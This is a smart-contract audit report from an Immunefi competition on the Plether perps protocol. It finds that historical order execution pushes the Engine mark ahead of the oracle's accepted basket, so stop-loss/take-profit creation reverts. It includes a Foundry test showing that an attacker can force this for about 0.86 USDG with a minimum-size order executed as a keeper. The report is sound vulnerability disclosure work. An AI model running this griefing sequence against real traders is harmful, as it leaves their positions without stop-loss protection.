# \#99613 [SC-Low] Historical order execution advances only the Engine mark, so the oracle's publish-order check in `PositionProtectionBook` rejects a fresh, consistent price and blocks stop-loss/take-profit creation 

**Submitted on Nov 14th 2026 at 13:50:50 UTC by @godwinudo for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99613
- **Report Type:** Smart Contract
- **Report severity:** Low
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Contract fails to deliver promised returns, but doesn't lose value

## Description

## Brief/Intro
`PositionProtectionBook` validates every new or replaced stop-loss/take-profit, and every protected open, against the oracle's accepted live basket. It reads that basket through `PletherOracle.getLatestPrice(PriceMode.MarkRefresh)`, which reverts whenever the accepted basket is older than the Engine mark. Ordinary order execution writes its historical fill price into the Engine only, so after any order is executed the Engine is legitimately ahead of the oracle. From that point until the next live price update (a mark refresh, liquidation, protection trigger or LP-epoch settlement), `createPositionProtection`, `replacePositionProtection` and `commitOpenOrderWithProtection` all revert with `PletherOracle__PriceOutOfOrder`, even though the oracle price is fresh and identical to the Engine price. The Book's own synchronization check, and the team's MED-28 fix note, explicitly treat this state as valid. Because the official SDK submits these actions as a single call with no refresh, the failure happens in normal trading with no attacker. Anyone can also force it on demand with a minimum-size order for about 0.86 USDG.

## Vulnerability Details

The protocol keeps the current basket price in two places. The first is the `PletherOracle` accepted live basket (`_acceptedBasket`). It is written only when a caller supplies a complete signed current basket to `_resolveCurrentBasket`, which happens in the live mark-refresh, liquidation, protection-trigger and LP-epoch paths:

```solidity
// packages/perps/src/PletherOracle.sol:786-799 (_resolveCurrentBasket)
if (hasAcceptedBasket && basket.publishTime < _acceptedBasket.publishTime) {
    revert PletherOracle__PriceOutOfOrder(basket.publishTime, _acceptedBasket.publishTime);
}
...
for (uint256 i; i < len; ++i) {
    _acceptedPrices[i] = feeds[i].price;
}
_acceptedBasket = basket;
hasAcceptedBasket = true;
```

The second is the Engine mark (`CfdEngine.lastMarkPrice` / `lastMarkTime`). Live paths write it too, but so does every delayed-order execution. Execution resolves a unique historical basket after the order's `commitTime` through `_updateOrderExecutionPrice` (or `updateBatchOrderExecutionPrice` for batches, `PletherOracle.sol:283`). Both build the snapshot with ordering enforcement off and never touch `_acceptedBasket`:

```solidity
// packages/perps/src/PletherOracle.sol:545-557
function _updateOrderExecutionPrice(
    address refundRecipient,
    bytes[] calldata pythUpdateData,
    OrderExecutionRequest calldata request
) internal returns (bool ok, PriceSnapshot memory snapshot) {
    PolicySnapshot memory policy = _policyForMode(PriceMode.OrderExecution);
    BasketPrice memory basket;
    (basket, ok) = _resolveOrderExecutionBasket(refundRecipient, pythUpdateData, request, policy);
    ...
    snapshot = _snapshotFromBasket(basket, policy, false);
```

The Router then installs that historical price as the Engine mark whenever it is newer:

```solidity
// packages/perps/src/OrderRouterExecutionSidecar.sol:1053-1061
function _updateEngineMark(
    IOrderRouterExecutionHost host,
    OracleResult memory result
) private {
    ICfdEngineCore engine_ = ICfdEngineCore(host.engine());
    if (result.publishTime > engine_.lastMarkTime()) {
        engine_.updateMarkPrice(result.neutralMarkPrice, result.publishTime);
    }
}
```

So after an order executes, `engine.lastMarkTime()` is ahead of `_acceptedBasket.publishTime`. The documentation states this is expected: "historical execution may advance the Engine without advancing the accepted live basket" (`ORACLE_SYNCHRONIZATION.md:150-151`).

Position protection is supposed to tolerate this state. All three protection entrypoints (`_create` line 229, `_replace` line 295, `_stageAttached` line 463) obtain their price observation from `_freshProtectionObservation`, which ends with a synchronization check, `_acceptedMarkInstalled`:

```solidity
// packages/perps/src/PositionProtectionBook.sol:862-895
function _freshProtectionObservation()
    private
    view
    returns (uint256 cachedMarkPrice, uint256 currentMarkPrice, uint64 currentPublishTime)
{
    IPletherOracle oracle = _activeOracle();
    IPletherOracle.PolicySnapshot memory policy = oracle.getOrderExecutionPolicy(true);
    ...
    IPletherOracle.PriceSnapshot memory current = oracle.getLatestPrice(IPletherOracle.PriceMode.MarkRefresh);
    currentMarkPrice = current.markPrice;
    currentPublishTime = current.publishTime;
    if (!_acceptedMarkInstalled()) {
        revert PositionProtectionBook__OracleMarkAhead();
    }
}

function _acceptedMarkInstalled() private view returns (bool) {
    (bool accepted, uint256 acceptedPrice, uint64 acceptedTime) = _activeOracle().getAcceptedBasketMark();
    if (!accepted) {
        return true;
    }
    uint64 markTime = ENGINE.lastMarkTime();
    return acceptedTime < markTime || (acceptedTime == markTime && acceptedPrice == ENGINE.lastMarkPrice());
}
```

`_acceptedMarkInstalled` returns `true` when `acceptedTime < markTime`. In other words, the Book deliberately accepts an Engine that is ahead of the oracle and rejects only an oracle that is ahead of, or inconsistent with, the Engine (`PositionProtectionBook__OracleMarkAhead`). The attached-open arming hook relies on the same predicate, right after a parent fill has advanced the Engine (`afterOrderTerminal`, line 598-602). The team's resolution of the prior audit finding MED-28, which introduced this check, describes the same intent (Cecuro report, MED-28 comment):

> The integrated synchronization guard also rejects arming when the accepted oracle mark is ahead of, or inconsistent with, the Engine mark. A qualifying mark must be installed before arming can proceed.

However, that check is never reached when the Engine is ahead. The preceding call, `oracle.getLatestPrice(PriceMode.MarkRefresh)`, goes through `_getLatestPriceSnapshotWithConfidence`, which builds the snapshot with `enforcePublishOrder = true`:

```solidity
// packages/perps/src/PletherOracle.sol:571-578
function _getLatestPriceSnapshotWithConfidence(
    PriceMode mode
) internal view returns (PriceSnapshot memory snapshot, uint256 confidence) {
    PolicySnapshot memory policy = _policyForMode(mode);
    BasketPrice memory basket = policy.oracleFrozen
        ? _frozenBasket(mode, policy.maxStaleness)
        : _acceptedLiveBasket(mode, policy.maxStaleness, _policyPublishTimeDivergence(mode, policy));
    snapshot = _snapshotFromBasket(basket, policy, true);
```

```solidity
// packages/perps/src/PletherOracle.sol:892-896 (_snapshotFromBasket)
if (enforcePublishOrder) {
    uint64 markTime = engine.lastMarkTime();
    if (snapshot.publishTime < markTime) {
        revert PletherOracle__PriceOutOfOrder(snapshot.publishTime, markTime);
    }
```

`snapshot.publishTime` here is the accepted basket's publish time. In exactly the state the Book means to accept (`acceptedTime < markTime`), the oracle view reverts with `PletherOracle__PriceOutOfOrder(acceptedTime, markTime)` before `_acceptedMarkInstalled` is evaluated. That branch of the Book's check is unreachable, and the MED-28 guarantee becomes stricter than specified: arming is rejected not only when the oracle is ahead of the Engine, but also whenever the Engine is ahead. This happens even when both hold the same price and the accepted basket is well inside the 60-second `orderExecutionStalenessLimit` (`PletherOracle.sol:76`) that governs `MarkRefresh` freshness.

The state arises in ordinary operation. The official account-abstraction SDK builds every protection action as one call to the Book, with zero native value and no preceding mark refresh. It therefore relies on whatever accepted basket is already on-chain:

```ts
// packages/perps-aa-client/src/protection.ts:47-50
export function buildCreateProtectionAction(input: { account: Address; book: Address; params: PositionProtectionParams }): PerpsActionPlan {
  validateParams(input.params);
  return action("create-protection", input.account, input.book, encodeFunctionData({ abi: positionProtectionBookAbi, functionName: "createPositionProtection", args: [input.params] }));
}
```

`buildReplaceProtectionAction` and `buildProtectedOpenAction` (`commitOpenOrderWithProtection`, protection.ts:123) are built the same way. The accepted basket only advances on a live update (an explicit mark refresh, a liquidation, a protection trigger or LP-epoch settlement), while every executed order advances the Engine. So after any order execution with a post-refresh fill, every SDK create, replace or protected open fails until the next live update, with no attacker involved. A trader who follows the safer two-transaction flow (refresh, then create) is affected too: if an order committed at or after their refresh tick is executed between their two transactions, the second one reverts.

The failure can also be forced deliberately. Historical execution parses Pyth with `parsePriceFeedUpdatesUnique` over `(commitTime, min(commitTime + orderSettlementWindow, block.timestamp)]`, so the fill tick is the first tick after the order's commit. An order therefore moves the Engine past the victim's accepted tick only if it was committed at or after that tick. An attacker who sees the victim's refresh commits a minimum-size order (1,000 USDG `minOpenNotionalAssets`) in the next block. One Pyth second later, the attacker executes it as a permissionless keeper (execution must be in a later block than the commit, `OrderRouterExecutionSidecar.sol:447`). The victim's create, sent a few seconds after the refresh, then reverts. The state lasts until the next live update, and the attacker can repeat it against any retry that leaves the same gap between refresh and create.

Already-armed protections still fire: activation requires a tick newer than arming (`OrderRouter__TriggerPublishTimeNotAdvanced`), and the trigger keeper performs a live `updateMarkPrice` with a current signed basket, which advances both prices together before the Book is consulted. Manual closes, plain opens, cancellation and `cancelPositionProtectionAndCommitClose` do not use this observation either.

## Impact Details

Traders cannot arm, replace or attach a stop-loss/take-profit while the Engine is ahead of the oracle's accepted basket, even though the price is fresh and consistent. This holds after every order execution with a post-refresh fill, until the next live price update. The protocol presents protection as its risk-management feature, and both its own synchronization rule and the MED-28 resolution state that this state should be accepted. The failure leaves positions unprotected during the window. The official SDK builders contain no refresh step, so an SDK user must notice the revert and add a paid `updateMarkPrice` themselves. In the end-to-end PoC, the victim's 12,000 USDG LONG cannot be protected 2 seconds after its own refresh. The accepted basket is 1.20, the same as the Engine, and within the 60-second limit. The identical call succeeds after one more refresh. Forcing this costs an attacker exactly 0.864 USDG (two 4 bps execution fees on a 1,080 USDG order, just above the 1,000 USDG minimum), with no profit.


## Proof of Concept

## Proof of Concept


The test asserts that:
- after the victim's own refresh, the attacker's minimum order executed one second later moves the Engine mark to T+1 while the accepted basket stays at T, at the same 1.20 price, within the 60-second limit;
- the victim's `createPositionProtection` reverts with `PletherOracle__PriceOutOfOrder(T, T+1)` and leaves no protection;
- the identical call succeeds after one more refresh;
- the attacker's net cost is at least the two documented execution fees and below 5 USDG;
- protocol custody grows by exactly that cost;
- the victim's balance changes by no more than ordinary carry.

Create a file `test/audit/ProtectionCreateEngineAheadE2E.t.sol`, input the code below, and run with:

```bash
forge test --match-path test/audit/ProtectionCreateEngineAheadE2E.t.sol -vvv
```

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {DeployPerpsArbitrumSepolia} from "../../script/DeployPerpsArbitrumSepolia.s.sol";
import {MockPyth} from "../mocks/MockPyth.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {PletherOracle} from "@plether/perps/PletherOracle.sol";
import {IPletherOracle} from "@plether/perps/interfaces/IPletherOracle.sol";
import {IPositionProtectionActions} from "@plether/perps/interfaces/IPositionProtectionActions.sol";
import {IPositionProtectionViews} from "@plether/perps/interfaces/IPositionProtectionViews.sol";
import {PositionProtectionTypes} from "@plether/perps/interfaces/PositionProtectionTypes.sol";
import {Test} from "forge-std/Test.sol";

/// @dev External dependency: mirrors the Arbitrum ArbSys block-number precompile inside the local EVM.
contract E2EArbSys {

    function arbBlockNumber() external view returns (uint256) {
        return block.number;
    }

}

/// @notice End-to-end: release stack deployed by the production deploy script; every protocol interaction is a public
///         transaction by an unprivileged actor. Only external dependencies (Pyth, ArbSys) are test doubles.
contract ProtectionCreateEngineAheadE2ETest is Test {

    // --- release / environment constants (script, DEPLOYMENT.md, protocol e2e setup) ---
    address internal constant RELEASE_PYTH = 0x0B73614636C855Bf23F342F307FB981A3e47f42B;
    address internal constant ARBSYS = address(100);
    uint256 internal constant ARBITRUM_SEPOLIA_CHAIN_ID = 421_614;
    uint256 internal constant DEPLOYER_KEY = 0xA11CE;
    uint256 internal constant MONDAY_MORNING = 1_709_532_000; // live FX market hours
    uint256 internal constant SEED_ASSETS = 1e6; // DEPLOYMENT.md: senior / junior seed 1e6 each
    uint256 internal constant FEED_COUNT = 6;
    uint256 internal constant PRICE_SCALE = 1e8;
    uint256 internal constant INVERSE_NUMERATOR = 1e16;
    int32 internal constant PYTH_EXPO = -8;
    uint256 internal constant EXECUTION_FEE_BPS = 4; // DEPLOYMENT.md executionFeeBps
    uint256 internal constant BPS = 10_000;
    uint256 internal constant NOTIONAL_DIVISOR = 1e20; // size(1e18) * price(1e8) -> 6-decimal assets
    uint256 internal constant BASE_CARRY_BPS = 500; // script _riskParams baseCarryBps (annual)
    uint256 internal constant SECONDS_PER_YEAR = 365 days;
    uint8 internal constant LIVE_MODE_ONLY = 1;

    // --- actors (fresh, unprivileged) ---
    address internal constant LP = address(0x1F);
    address internal constant VICTIM = address(0xA11CE5);
    address internal constant ATTACKER = address(0xBAD);
    address internal constant KEEPER = address(0xB07);

    // --- scenario constants ---
    uint256 internal constant BASKET_PRICE = 120_000_000; // 1.20, non-unit basket
    uint256 internal constant PRICE_TOLERANCE = 10;
    uint256 internal constant LP_ASSETS = 1_000_000e6;
    uint256 internal constant VICTIM_DEPOSIT = 5000e6;
    uint256 internal constant VICTIM_SIZE = 10_000e18;
    uint256 internal constant VICTIM_MARGIN = 1000e6;
    uint256 internal constant ATTACKER_DEPOSIT = 500e6;
    uint256 internal constant ATTACKER_SIZE = 900e18; // 1,080 USDG notional >= minOpenNotionalAssets (1,000 USDG)
    uint256 internal constant ATTACKER_MARGIN = 100e6;
    uint256 internal constant OPEN_MIN_PRICE = 115_000_000;
    uint256 internal constant CLOSE_MAX_PRICE = 130_000_000;
    uint256 internal constant TAKE_PROFIT = 110_000_000; // LONG profits when the basket falls
    uint256 internal constant STOP_LOSS = 125_000_000;
    uint256 internal constant EXECUTION_WINDOW = 60;
    uint256 internal constant MAX_BOUNTY = 100e6;
    uint256 internal constant MAX_NOTIONAL = 13_000e6;
    uint256 internal constant MAX_DEBIT = 1100e6;
    uint256 internal constant MAX_CHARGE = 100e6;
    uint256 internal constant MAX_LEVERAGE_BPS = 200_000;
    uint256 internal constant IDLE_SECONDS = 30;
    uint256 internal constant ATTACKER_COST_CEILING = 5e6;

    DeployPerpsArbitrumSepolia.DeployedContracts internal d;
    PletherOracle internal oracle;
    IPositionProtectionActions internal book;
    IPositionProtectionViews internal bookViews;

    function setUp() public {
        // Protocol's own e2e setup (test/scripts/MockUSDGPerpsLifecycle.t.sol): release deploy script + bootstrap.
        vm.chainId(ARBITRUM_SEPOLIA_CHAIN_ID);
        vm.warp(MONDAY_MORNING);
        vm.etch(ARBSYS, address(new E2EArbSys()).code);
        vm.etch(RELEASE_PYTH, address(new MockPyth()).code);
        vm.setEnv("TEST_PRIVATE_KEY", vm.toString(DEPLOYER_KEY));
        d = DeployPerpsArbitrumSepolia(deployCode("DeployPerpsArbitrumSepolia.s.sol:DeployPerpsArbitrumSepolia")).run();
        oracle = PletherOracle(d.pletherOracle);
        book = IPositionProtectionActions(d.positionProtectionBook);
        bookViews = IPositionProtectionViews(d.positionProtectionBook);

        // Documented bootstrap (script/BootstrapPerpsArbitrumSepolia.s.sol): seed both tranches, refresh, activate.
        address owner = vm.addr(DEPLOYER_KEY);
        d.settlementToken.mint(owner, 2 * SEED_ASSETS);
        vm.startPrank(owner);
        d.settlementToken.approve(address(d.housePool), 2 * SEED_ASSETS);
        d.housePool.initializeSeedPosition(false, SEED_ASSETS, owner);
        d.housePool.initializeSeedPosition(true, SEED_ASSETS, owner);
        _publishTick();
        d.router.updateMarkPrice(_pythPayload());
        d.housePool.activateTrading();
        vm.stopPrank();
    }

    function test_E2E_OrderExecutionBlocksProtectionCreateDespiteFreshConsistentPrice() public {
        // 1. LP supplies junior liquidity through the asynchronous epoch flow.
        d.settlementToken.mint(LP, LP_ASSETS);
        vm.startPrank(LP);
        d.settlementToken.approve(address(d.juniorVault), LP_ASSETS);
        uint256 lpRequest = d.juniorVault.requestDeposit(LP_ASSETS, LP, LP);
        vm.stopPrank();
        vm.warp(d.housePool.lpEpochStart(lpRequest));
        vm.roll(vm.getBlockNumber() + 1);
        _publishTick();
        vm.prank(LP);
        d.router.settleLpEpoch(_pythPayload());
        vm.prank(LP);
        d.juniorVault.claimDeposit(lpRequest, LP_ASSETS, LP, LP);

        // 2. Victim funds its margin account and opens a LONG executed by an independent keeper.
        _fundMargin(VICTIM, VICTIM_DEPOSIT);
        OrderV3Types.OrderRequest memory victimReq =
            _request("victim-open", VICTIM_SIZE, VICTIM_MARGIN, OPEN_MIN_PRICE, false, MAX_NOTIONAL);
        vm.prank(VICTIM);
        uint64 victimOpen = d.router.commitOrder(victimReq);
        _nextBlock(1);
        _publishTick();
        vm.prank(KEEPER);
        assertEq(
            uint8(d.router.executeOrder(victimOpen, _pythPayload()).status),
            uint8(OrderV3Types.LifecycleStatus.Executed),
            "victim position opened"
        );
        uint256 victimOpenTime = vm.getBlockTimestamp();
        (uint256 victimSize,,,,,,) = d.engine.positions(VICTIM);
        assertEq(victimSize, VICTIM_SIZE, "victim holds the position to protect");

        // 3. Time passes; victim performs the required live mark refresh (tx 1 of the normal 2-tx wallet flow).
        _nextBlock(IDLE_SECONDS);
        _publishTick();
        uint64 refreshTime = uint64(vm.getBlockTimestamp());
        vm.prank(VICTIM);
        d.router.updateMarkPrice(_pythPayload());
        (, uint256 acceptedPx0, uint64 acceptedTime0) = oracle.getAcceptedBasketMark();
        assertEq(acceptedTime0, refreshTime, "accepted basket installed");
        assertEq(d.engine.lastMarkTime(), refreshTime, "engine mark synchronised");
        assertEq(acceptedPx0, d.engine.lastMarkPrice(), "same price");

        uint256 victimBalanceBefore = d.clearinghouse.balanceAssets(VICTIM);
        uint256 protocolCustodyBefore = _protocolCustody();

        // 4. Attacker (fresh account) funds margin and commits a minimum-size open in the next block, same second.
        vm.roll(vm.getBlockNumber() + 1);
        d.settlementToken.mint(ATTACKER, ATTACKER_DEPOSIT);
        uint256 attackerWalletBefore = d.settlementToken.balanceOf(ATTACKER);
        vm.startPrank(ATTACKER);
        d.settlementToken.approve(address(d.clearinghouse), ATTACKER_DEPOSIT);
        d.clearinghouse.depositMargin(ATTACKER_DEPOSIT);
        vm.stopPrank();
        OrderV3Types.OrderRequest memory attackerReq =
            _request("attacker-open", ATTACKER_SIZE, ATTACKER_MARGIN, OPEN_MIN_PRICE, false, MAX_NOTIONAL);
        vm.prank(ATTACKER);
        uint64 attackerOpen = d.router.commitOrder(attackerReq);

        // 5. Next Pyth second: attacker executes its own order as a permissionless keeper (historical post-commit tick).
        _nextBlock(1);
        _publishTick();
        vm.prank(ATTACKER);
        assertEq(
            uint8(d.router.executeOrder(attackerOpen, _pythPayload()).status),
            uint8(OrderV3Types.LifecycleStatus.Executed),
            "attacker order executed"
        );

        // 6. Independent expectation: oracle is NOT ahead of the Engine, prices agree, basket is fresh -> per the
        //    MED-28 fix rule and Book `_acceptedMarkInstalled`, arming must be allowed.
        _nextBlock(1);
        _publishTick();
        (, uint256 acceptedPx, uint64 acceptedTime) = oracle.getAcceptedBasketMark();
        uint64 engineTime = d.engine.lastMarkTime();
        assertEq(acceptedTime, refreshTime, "historical execution did not advance accepted basket");
        assertEq(engineTime, refreshTime + 1, "historical execution advanced engine mark");
        assertLt(acceptedTime, engineTime, "oracle behind (not ahead of) engine");
        assertEq(acceptedPx, d.engine.lastMarkPrice(), "oracle and engine prices are consistent");
        assertApproxEqAbs(acceptedPx, BASKET_PRICE, PRICE_TOLERANCE, "price is the true basket");
        assertLe(
            vm.getBlockTimestamp() - acceptedTime, oracle.orderExecutionStalenessLimit(), "accepted basket is fresh"
        );

        // 7. Victim's create (tx 2) is blocked: PriceOutOfOrder(accepted, engine).
        PositionProtectionTypes.PositionProtectionParams memory params = _protectionParams();
        vm.prank(VICTIM);
        vm.expectRevert(
            abi.encodeWithSelector(
                IPletherOracle.PletherOracle__PriceOutOfOrder.selector, uint256(acceptedTime), uint256(engineTime)
            )
        );
        book.createPositionProtection(params);
        assertEq(bookViews.activePositionProtectionId(VICTIM), 0, "victim left without stop-loss/take-profit");
        assertEq(d.clearinghouse.balanceAssets(VICTIM), victimBalanceBefore, "victim funds untouched");

        // 8. Control: one more paid live refresh with no execution in between -> identical create succeeds.
        vm.roll(vm.getBlockNumber() + 1);
        vm.prank(VICTIM);
        d.router.updateMarkPrice(_pythPayload());
        vm.prank(VICTIM);
        uint64 protectionId = book.createPositionProtection(params);
        assertEq(
            uint8(bookViews.getPositionProtection(protectionId).status),
            uint8(PositionProtectionTypes.PositionProtectionStatus.Armed),
            "only the intervening execution caused the failure"
        );

        // 9. Attacker closes and withdraws everything: griefing has a strictly positive cost and no profit.
        OrderV3Types.OrderRequest memory closeReq =
            _request("attacker-close", ATTACKER_SIZE, 0, CLOSE_MAX_PRICE, true, MAX_NOTIONAL);
        vm.prank(ATTACKER);
        uint64 attackerClose = d.router.commitOrder(closeReq);
        _nextBlock(1);
        _publishTick();
        vm.prank(ATTACKER);
        d.router.executeOrder(attackerClose, _pythPayload());
        (uint256 attackerSize,,,,,,) = d.engine.positions(ATTACKER);
        assertEq(attackerSize, 0, "attacker flat");
        uint256 attackerClaim = d.clearinghouse.balanceAssets(ATTACKER);
        vm.prank(ATTACKER);
        d.clearinghouse.withdrawMargin(attackerClaim);

        uint256 attackerWalletAfter = d.settlementToken.balanceOf(ATTACKER);
        uint256 attackerCost = attackerWalletBefore - attackerWalletAfter;
        uint256 notional = ATTACKER_SIZE * BASKET_PRICE / NOTIONAL_DIVISOR;
        uint256 minFees = 2 * notional * EXECUTION_FEE_BPS / BPS; // open + close execution fee
        assertGe(attackerCost, minFees, "attacker pays at least both execution fees");
        assertLt(attackerCost, ATTACKER_COST_CEILING, "griefing costs about a dollar");
        assertEq(_protocolCustody() - protocolCustodyBefore, attackerCost, "protocol gains exactly the attacker cost");
        uint256 victimNotional = VICTIM_SIZE * BASKET_PRICE / NOTIONAL_DIVISOR;
        uint256 maxVictimCarry =
            victimNotional * BASE_CARRY_BPS * (vm.getBlockTimestamp() - victimOpenTime) / BPS / SECONDS_PER_YEAR;
        assertLe(
            victimBalanceBefore - d.clearinghouse.balanceAssets(VICTIM),
            maxVictimCarry,
            "victim only pays ordinary carry; the grief costs the victim no funds"
        );
    }

    // ------------------------------------------------------------------ helpers (no in-scope state writes)

    function _nextBlock(
        uint256 secondsElapsed
    ) internal {
        vm.roll(vm.getBlockNumber() + 1);
        vm.warp(vm.getBlockTimestamp() + secondsElapsed);
    }

    /// @dev Pyth publishes a new tick for all six release feeds at the current second (external dependency).
    function _publishTick() internal {
        for (uint256 i; i < FEED_COUNT; ++i) {
            uint256 normalized = oracle.basePrices(i) * BASKET_PRICE / PRICE_SCALE;
            uint256 feedPrice = oracle.inversions(i) ? INVERSE_NUMERATOR / normalized : normalized;
            MockPyth(RELEASE_PYTH)
                .setPrice(oracle.pythFeedIds(i), int64(uint64(feedPrice)), PYTH_EXPO, vm.getBlockTimestamp());
        }
    }

    function _pythPayload() internal pure returns (bytes[] memory data) {
        data = new bytes[](1);
        data[0] = "";
    }

    function _fundMargin(
        address account,
        uint256 amount
    ) internal {
        d.settlementToken.mint(account, amount);
        vm.startPrank(account);
        d.settlementToken.approve(address(d.clearinghouse), amount);
        d.clearinghouse.depositMargin(amount);
        vm.stopPrank();
    }

    /// @dev All protocol-held USDG: every token was minted to a known actor, so supply minus actor wallets.
    function _protocolCustody() internal view returns (uint256) {
        return d.settlementToken.totalSupply() - d.settlementToken.balanceOf(LP) - d.settlementToken.balanceOf(VICTIM)
            - d.settlementToken.balanceOf(ATTACKER) - d.settlementToken.balanceOf(KEEPER)
            - d.settlementToken.balanceOf(vm.addr(DEPLOYER_KEY));
    }

    function _request(
        bytes32 clientId,
        uint256 size,
        uint256 margin,
        uint256 targetPrice,
        bool isClose,
        uint256 maxNotional
    ) internal view returns (OrderV3Types.OrderRequest memory r) {
        r.clientOrderId = clientId;
        r.side = CfdTypes.Side.LONG;
        r.sizeDelta = size;
        r.marginDelta = margin;
        r.targetPrice = targetPrice;
        r.isClose = isClose;
        r.bounds = OrderV3Types.ExecutionBounds({
            submitBy: uint64(vm.getBlockTimestamp() + EXECUTION_WINDOW),
            executionWindowSeconds: uint32(EXECUTION_WINDOW),
            allowedExecutionModes: LIVE_MODE_ONLY,
            expectedConfigHash: d.lifecycleBook.currentExecutionConfigHash(),
            maxExecutionBountyAssets: MAX_BOUNTY,
            maxExecutionNotionalAssets: maxNotional,
            maxGrossAccountDebitAssets: MAX_DEBIT,
            maxActionChargeAssets: MAX_CHARGE,
            maxExplicitFeesAssets: MAX_CHARGE,
            maxPostPositionSize: VICTIM_SIZE,
            minPostSettlementBalanceAssets: 0,
            minPostPositionEquityAssets: 0,
            maxPostLeverageBps: uint32(MAX_LEVERAGE_BPS)
        });
    }

    function _protectionParams() internal pure returns (PositionProtectionTypes.PositionProtectionParams memory p) {
        p.takeProfitTriggerPrice = TAKE_PROFIT;
        p.stopLossTriggerPrice = STOP_LOSS;
        p.closeLimits = PositionProtectionTypes.CloseFinancialLimits({
            maxExecutionNotionalAssets: MAX_NOTIONAL,
            maxGrossAccountDebitAssets: MAX_DEBIT,
            maxActionChargeAssets: MAX_CHARGE,
            maxExplicitFeesAssets: MAX_CHARGE
        });
    }

}
```

